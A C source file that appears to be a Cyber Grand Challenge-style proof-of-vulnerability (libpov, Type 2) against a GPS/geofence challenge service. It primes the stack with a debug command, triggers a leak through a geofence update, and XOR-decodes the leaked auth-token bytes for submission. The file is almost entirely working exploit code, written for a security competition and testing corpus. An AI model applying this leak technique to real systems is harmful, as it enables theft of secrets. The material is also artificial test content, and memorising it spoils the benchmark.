/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>

size_t ReadBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t total_bytes = 0;
	size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

size_t SendBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t tx_bytes;
	size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType2Pov( uint32_t *type2_addr, uint32_t *type2_size, uint32_t *type2_length)
{
        uint32_t PovType = 2;

        // Request Type 2 negotitation
        if ( SendBytes( 3, (uint8_t *)&PovType, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte value for type2_addr
        if ( ReadBytes( 3, (uint8_t *)type2_addr, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte size for type_size
        if ( ReadBytes( 3, (uint8_t *)type2_size, 4 ) != 4)
                _terminate(-1);

        // get the 4-byte value for type2_length
        if ( ReadBytes( 3, (uint8_t *)type2_length, 4 ) != 4)
                _terminate(-1);

}

uint8_t CalcCRC8( uint8_t *pData, uint16_t dataLen, uint8_t startVal )
{
	uint8_t crcVal = startVal;

	for ( uint16_t pos = 0; pos < dataLen; pos++ )
		crcVal += pData[pos];

	return crcVal;	
}

void SendCommand( uint8_t commandNum, uint8_t *pCommandData, uint16_t commandLength )
{
	SendBytes( STDOUT, &commandNum, 1 );
	SendBytes( STDOUT, (uint8_t*)&commandLength, 2 );
	
	if ( commandLength > 0 )
		SendBytes( STDOUT, pCommandData, commandLength );
	
	// Calculate crc
	uint8_t crcVal = CalcCRC8( &commandNum, 1, 0 );
	crcVal = CalcCRC8( (uint8_t*)&commandLength, 2, crcVal );

	if ( commandLength > 0 )
		crcVal = CalcCRC8( pCommandData, commandLength, crcVal );

	SendBytes( STDOUT, &crcVal, 1 );
}

void GetResponse( uint8_t *pDest, uint16_t *pDestLen )
{
	uint8_t crcVal;

	// Read response header
	typedef struct RESPONSE_HEADER
	{
		uint8_t commandNum;
		uint8_t responseType;
		uint16_t responseLength;
	} __attribute__((packed)) tResponseHeader;

	tResponseHeader oHeader;

	if ( ReadBytes( STDIN, (uint8_t*)&oHeader, sizeof(oHeader) ) != sizeof(oHeader) )
		_terminate( -1 );

	if ( oHeader.responseLength > 0 )
	{
		if ( ReadBytes( STDIN, pDest, oHeader.responseLength ) != oHeader.responseLength )
			_terminate( -1 );
	}

	if ( ReadBytes( STDIN, &crcVal, 1 ) != 1 )
		_terminate( -1 );

	(*pDestLen) = oHeader.responseLength;
}

#define EAX_REG_NUM	(0)
#define ECX_REG_NUM	(1)
#define EDX_REG_NUM	(2)
#define EBX_REG_NUM	(3)
#define ESP_REG_NUM	(4)
#define EBP_REG_NUM	(5)
#define ESI_REG_NUM	(6)
#define EDI_REG_NUM	(7)

#define COMMAND_SHUTDOWN	(1)
#define COMMAND_DEBUG		(2)
#define COMMAND_UPDATE_GEOFENCE (3)
#define COMMAND_GPS_ON		(6)

#define UPDATE_GEOFENCE_NEW	(0)
#define UPDATE_GEOFENCE_ADD	(1)

int main(void) 
{
	// Buffer for command data
	uint8_t commandData[1024];
	uint8_t responseData[4096];
	uint16_t responseLength;

	uint32_t type2_addr;
	uint32_t type2_size;
	uint32_t type2_length;
	
	// Type 2
	NegotiateType2Pov( &type2_addr, &type2_size, &type2_length );

	// Turn on GPS
	SendCommand( COMMAND_GPS_ON, NULL, 0 );
	GetResponse( responseData, &responseLength );

	// Do debug command (primes stack with auth token)
	typedef struct DEBUG_COMMAND_STRUCT
	{
		uint64_t authToken;
		uint8_t debugCommand;
		uint8_t debugCommandLen;
	} __attribute__((packed)) tDebugCommand;

	tDebugCommand oDebugCommand;
	oDebugCommand.authToken = 0x0;
	oDebugCommand.debugCommand = 0;
	oDebugCommand.debugCommandLen = 0;

	// Send debug command -- this will fail auth token!
	SendCommand( COMMAND_DEBUG, (uint8_t*)&oDebugCommand, sizeof(oDebugCommand) );
	GetResponse( responseData, &responseLength );

	// Send add geofence command
	uint8_t add_point_count = 1;
	commandData[0] = UPDATE_GEOFENCE_NEW;
	commandData[1] = add_point_count;	
	
	for ( uint32_t i = 0; i < add_point_count; i++ )
	{
		uint8_t *pDataPos = (commandData+2)+(i*10);
	
		*((uint32_t*)pDataPos) = 100000000;	// Always in-bounds

		// Point will be at 0 00'00" latitude and 0 00'00" longitude	
		(pDataPos+4)[0] = 0x00;
		(pDataPos+4)[1] = 0x00;
		(pDataPos+4)[2] = 0x00;
		(pDataPos+4)[3] = 0x00;
		(pDataPos+4)[4] = 0x00;
		(pDataPos+4)[5] = 0x00;
	}

	SendCommand( COMMAND_UPDATE_GEOFENCE, commandData, (2+(add_point_count*10)) );
	GetResponse( responseData, &responseLength );

	// Submit type 2 data -- reverse the xor'ing of the auth token
	uint8_t type2_data[4];
	type2_data[0] = responseData[1] ^ 0x7A;
	type2_data[1] = responseData[2] ^ 0x33;
	type2_data[2] = responseData[3] ^ 0x31;
	type2_data[3] = responseData[4] ^ 0x03;

	SendBytes( 3, type2_data, 4 );

	return 0;
}
